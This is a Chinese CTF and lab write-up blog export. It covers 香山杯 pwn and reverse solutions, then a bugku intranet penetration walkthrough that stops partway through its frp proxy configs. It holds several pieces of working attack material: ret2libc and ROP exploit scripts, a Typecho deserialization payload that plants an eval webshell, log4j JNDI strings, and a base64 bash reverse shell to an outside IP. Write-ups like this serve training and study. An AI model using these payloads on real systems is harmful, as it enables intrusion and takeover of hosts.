    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="move"><a href="#move" class="headerlink" title="move"></a>move</h3><p>简单的栈迁移</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = p64(<span class="number">0x0000000000401353</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pld += p64(<span class="number">0x0000000000401264</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;travel again!\n&quot;</span>, pld)</span><br><span class="line">sh.sendafter(<span class="string">&quot;setp number&quot;</span>, p32(<span class="number">0x12345678</span>))</span><br><span class="line"></span><br><span class="line">pld = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0x00000000004050A0</span>-<span class="number">8</span>) + p64(<span class="number">0x000000000040124b</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;TaiCooLa&quot;</span>, pld)</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pld = p64(<span class="number">0x0000000000401353</span>) + p64(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sh.sendafter(<span class="string">&quot;travel again!\n&quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h3><p>查看python可调用的后缀：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.machinery</span><br><span class="line"><span class="built_in">print</span>(importlib.machinery.all_suffixes())</span><br><span class="line"><span class="comment"># [&#x27;.py&#x27;, &#x27;.pyc&#x27;, &#x27;.cpython-310-x86_64-linux-gnu.so&#x27;, &#x27;.abi3.so&#x27;, &#x27;.so&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>用python调用了so文件，首先就是一顿乱试，发现只有功能1有问题，会返回给我们不可见的字符，推测应该是输出了栈上残留的信息。IDA里面通过字符串找到了功能1的函数，发现了一个格式化字符串和一个栈溢出。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231018160558969.png" alt="image-20231018160558969"></p>
<p>找libc是个难点，感觉本地还好，到了远程可能LibcSearcher也不上什么忙了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3.7&quot;</span>, <span class="string">&quot;main.py&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&quot;./app.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give you a gift &quot;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x68b0</span></span><br><span class="line">success(<span class="string">&quot;code_base : &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;%p&quot;</span> * <span class="number">100</span>)</span><br><span class="line">sh.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">txt = sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">set</span>(txt.split(<span class="string">b&#x27;0x&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="number">16</span> <span class="keyword">and</span> i[-<span class="number">2</span>:] == <span class="string">b&#x27;00&#x27;</span>:</span><br><span class="line">        canary = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + i, <span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;canary : &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(<span class="string">b&#x27;0x7f&#x27;</span> + txt.split(<span class="string">b&#x27;0x7f&#x27;</span>)[<span class="number">2</span>][<span class="number">0</span>:<span class="number">10</span>], <span class="number">16</span>) - <span class="number">0x114a21</span></span><br><span class="line">success(<span class="string">&quot;libc_base : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(code_base + <span class="number">0x000000000000301a</span>)</span><br><span class="line">pld += p64(code_base + <span class="number">0x0000000000003f8f</span>)</span><br><span class="line">pld += p64(libc_base + <span class="number">0x1d8698</span>)</span><br><span class="line">pld += p64(libc_base + <span class="number">0x50d70</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="url从哪里来"><a href="#url从哪里来" class="headerlink" title="url从哪里来"></a>url从哪里来</h3><p>动态调试发现在用户Temp目录下创建了一个文件，然后创建了子进程执行创建的文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016180022997.png" alt="image-20231016180022997"></p>
<p>把创建的文件拖出来进行分析，发现在开头对字符串进行base64，结果放到一个堆块里，然后释放了，点开来发现是flag。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016181820654.png" alt="image-20231016181820654"></p>
<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><p>一开始还以为是apk逆向，后来看看题目名字琢磨一下应该是找一个python文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016183700402.png" alt="image-20231016183700402"></p>
<p>注意拉取的时候要给root权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\adb.exe root</span><br><span class="line">.\adb.exe pull /data/data/com.mz.pytest/files/chaquopy/AssetFinder/app/__pycache__/hello.cpython-38.pyc C:\Users\13106\Desktop</span><br></pre></td></tr></table></figure>

<p>有一点混淆在里面，去除混淆后找到特证发现是xxtea加密，没有改什么，网上脚本一把嗦：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">9</span>] = &#123;<span class="number">689085350</span>, <span class="number">626885696</span>, <span class="number">1894439255</span>, <span class="number">1204672445</span>, <span class="number">1869189675</span>, <span class="number">475967424</span>, <span class="number">1932042439</span>, <span class="number">1280104741</span>, <span class="number">2808893494</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">12345678</span>, <span class="number">12398712</span>, <span class="number">91283904</span>, <span class="number">12378192</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p<span class="number">-1</span>];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;v[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nesting"><a href="#nesting" class="headerlink" title="nesting"></a>nesting</h3><p>乍一看像是VM，第一个函数应该初始化用的，第二个就是处理指令的函数，没有什么思路，看了看团队的WP，顺着自己尝试一下。首先是发现程序存在两处比较，而且都是比较一个字符，那么猜测应该是逐字符比较，可以用爆破。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016204435223.png" alt="image-20231016204435223"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016203115084.png" alt="image-20231016203115084"></p>
<p>通过调试发现<code>case 0x28</code>才是真正判断的语句。一来是因为断在0x29的地方会发现运行不会给提示，而断在0x28的地方运行会有提示；二来会发现在0x28分支中的变量v8的初始值是和我们输入字符串的长度有关，并且执行次数是和我们输入字符串正否有关的，很明显输入<code>flag</code>和输入<code>faaa</code>的执行次数是完全不一样的，而且是可以计数的。</p>
<p>为了方便爆破，我修改了程序的代码，使得当进入0x28这个分支的时候打印出一段固定的字符串。测试下来发现，进入分支0x28的次数是：输入字符串的长度 + 2 + 正确字符个数 * 2，也就是说当输入<code>fa</code>，打印了6次。用这样的方法我爆破出了一半的flag，<code>flag&#123;2c7c093b-f6</code>，但是接着爆破就不满足上面的条件了，所以干脆取最大值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./nesting_patch&quot;)</span></span><br><span class="line"><span class="comment"># sh.sendafter(&#x27;Input your flag:&#x27;, b&#x27;fl&#x27;)</span></span><br><span class="line"><span class="comment"># print(sh.recv().count(b&#x27;$\x00\x00\x004&#x27;))</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">table = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">&#x27;-_&#123;&#125;?\/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) + <span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    maxcount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        sh = process(<span class="string">&quot;./nesting_patch&quot;</span>)</span><br><span class="line">        tmp = flag + j</span><br><span class="line">        sh.sendafter(<span class="string">&#x27;Input your flag:&#x27;</span>, tmp)</span><br><span class="line">        x = sh.recvrepeat(<span class="number">1</span>).count(<span class="string">b&#x27;$\x00\x00\x004&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; maxcount:</span><br><span class="line">            maxcount = x</span><br><span class="line">            right = j</span><br><span class="line">        sh.close()</span><br><span class="line"></span><br><span class="line">    flag += right</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> right == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 渗透测试2</title>
    <url>/2023/10/04/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/</url>
    <content><![CDATA[<h2 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h2><p>一个博客系统，没什么入口，扫一下指纹。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230926201750381.png" alt="image-20230926201750381"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230926201811540.png" alt="image-20230926201811540"></p>
<p>网上找找，该版本的Typecho存在一个反序列化漏洞，直接拿poc试试看。</p>
<blockquote>
<p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111476577">https://blog.csdn.net/xuandao_ahfengren/article/details/111476577</a></p>
<p><a href="https://www.cnblogs.com/wuhongbin/p/15526142.html">https://www.cnblogs.com/wuhongbin/p/15526142.html</a></p>
</blockquote>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS1</span> = <span class="string">&#x27;RSS 1.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">ATOM1</span> = <span class="string">&#x27;ATOM 1.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_RFC822</span> = <span class="string">&#x27;r&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_W3CDTF</span> = <span class="string">&#x27;c&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">EOL</span> = <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_type</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_items</span>; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_type = <span class="variable language_">$this</span>::<span class="variable constant_">RSS2</span>; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>( </span><br><span class="line">    	<span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>, </span><br><span class="line">    	<span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>, </span><br><span class="line">    	<span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1508895132</span>, </span><br><span class="line">    	<span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>()), </span><br><span class="line">    	<span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(), </span><br><span class="line">    	); </span><br><span class="line">  	&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>; </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>( </span><br><span class="line">	<span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>(), </span><br><span class="line">	<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span> </span><br><span class="line">); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230926201922871.png" alt="image-20230926201922871"></p>
<p>成功，直接写木马拿shell。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span>= <span class="keyword">array</span>(<span class="string">&#x27;screenName&#x27;</span>=&gt; <span class="string">&quot;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php eval(\$_POST[z]);//?&gt;&#x27;)&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span>= <span class="keyword">array</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>=<span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$items</span>[<span class="string">&#x27;author&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>]=<span class="variable">$items</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;typecho&#x27;</span>;	<span class="comment">// 值是任意的</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230926203242721.png" alt="image-20230926203242721"></p>
<h2 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h2><p>找到配置文件进数据库拿flag。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230926203124445.png" alt="image-20230926203124445"></p>
<h2 id="场景3、4、5"><a href="#场景3、4、5" class="headerlink" title="场景3、4、5"></a>场景3、4、5</h2><p>尝试提权但是没能成功，扫一下内网看看呢。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231003151652625.png" alt="image-20231003151652625"></p>
<p>是一个登录页面，尝试弱口令没能成功，但是在返回的数据包中发现了源码的地址，直接下载。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231003154956025.png" alt="image-20231003154956025"></p>
<p>直接给提示了打log4j。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- log4j2核心依赖 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 存在漏洞的版本，安全版本2.15.0-rc2，见gayhub --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接用dnslog测试一下是不是存在，顺便看看java版本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//example.com/exp&#125;</span></span><br><span class="line">$&#123;jndi:dns:<span class="comment">//$&#123;sys:java.version&#125;.example.com&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231003194118605.png" alt="image-20231003194118605"></p>
<p>发现dnslog能够成功回显，直接上工具。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguMjM5LjIxNy8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;your vps&quot;</span><br></pre></td></tr></table></figure>

<p>反弹shell后发现直接是root用户，开始flag自助。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231003195419946.png" alt="image-20231003195419946"></p>
<p>在更目录下的<code>start.sh</code>中标明了三个flag的位置，发现直接echo环境变量也可以拿。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line">echo $FLAG4 &gt; /flag</span><br><span class="line">echo $FLAG5 &gt; /root/flag</span><br><span class="line">chmod 777 /flag</span><br><span class="line">chmod 700 /root/flag</span><br><span class="line"></span><br><span class="line">jar -xvf log4j2-ctf-0.0.1-SNAPSHOT.jar</span><br><span class="line">sed -i &#x27;s/Java Log4j2 RCE/&#x27;Bugku后台管理系统&#x27;/g&#x27; /BOOT-INF/classes/static/index.html</span><br><span class="line">sed -i &#x27;s/MIT/&#x27;$FLAG3&#x27;/g&#x27; /BOOT-INF/classes/static/anime.min.js</span><br><span class="line">jar -cvfM0 start.jar BOOT-INF/ META-INF/ org/</span><br><span class="line"></span><br><span class="line">java -jar /start.jar</span><br><span class="line">export FLAG3=not_flag</span><br><span class="line">FLAG3=not_flag</span><br><span class="line">export FLAG4=not_flag</span><br><span class="line">FLAG4=not_flag</span><br><span class="line">export FLAG5=not_flag</span><br><span class="line">FLAG5=not_flag</span><br><span class="line"></span><br><span class="line">rm -rf /start.sh</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="场景6、7"><a href="#场景6、7" class="headerlink" title="场景6、7"></a>场景6、7</h2><p>内网找到一个仓库的主机。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231003200527594.png" alt="image-20231003200527594"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231004114610694.png" alt="image-20231004114610694"></p>
<p>既然可以上传仓库，那么就搭建一个有后门的仓库，上传蚁剑直接连，我尝试上传php发现被过滤了没有执行，网上找了找wp发现phtml可执行，偷懒就用了wp给的项目。</p>
<blockquote>
<p><a href="https://github.com/QRLing1/hello4">QRLing1&#x2F;hello4 (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231004115128611.png" alt="image-20231004115128611"></p>
<h2 id="场景8、9"><a href="#场景8、9" class="headerlink" title="场景8、9"></a>场景8、9</h2><p>发现新的内网，fscan扫一下看看，发现10.10.0.3只开了一个21端口，那应该是登录FTP拿flag，况且给了我们提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 10.10.0.2       is alive</span><br><span class="line">(icmp) Target 10.10.0.3       is alive</span><br><span class="line">(icmp) Target 10.10.0.1       is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">10.10.0.3:21 open</span><br><span class="line">10.10.0.1:80 open</span><br><span class="line">10.10.0.2:80 open</span><br><span class="line">10.10.0.1:22 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.10.0.2          code:200 len:524    title:乙公司Git仓库</span><br><span class="line">[*] WebTitle: http://10.10.0.1          code:200 len:3368   title:Harry&#x27;s Blog</span><br></pre></td></tr></table></figure>

<p>测试了一下，发现用户名和密码都是guest。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231004141436210.png" alt="image-20231004141436210"></p>
<p>找到flag了捏并且提示根目录下也有。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231004141710439.png" alt="image-20231004141710439"></p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>记录一下frp穿透的过程。总得来说，frp的稳定性还是不错的，但是操作起来还是有些麻烦，而且我在渗透的过程中发现对于多级网络的代理，如果服务端和客户端文件的执行顺序不对还会发生冲突，导致我重新搭了好多次。</p>
<ul>
<li><p>VPS：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
</li>
<li><p>博客系统：</p>
<p>服务端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.0.2</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.0.2</span><br><span class="line">local_port = 10808</span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></table></figure>
</li>
<li><p>仓库系统：</p>
<p>服务端：</p>
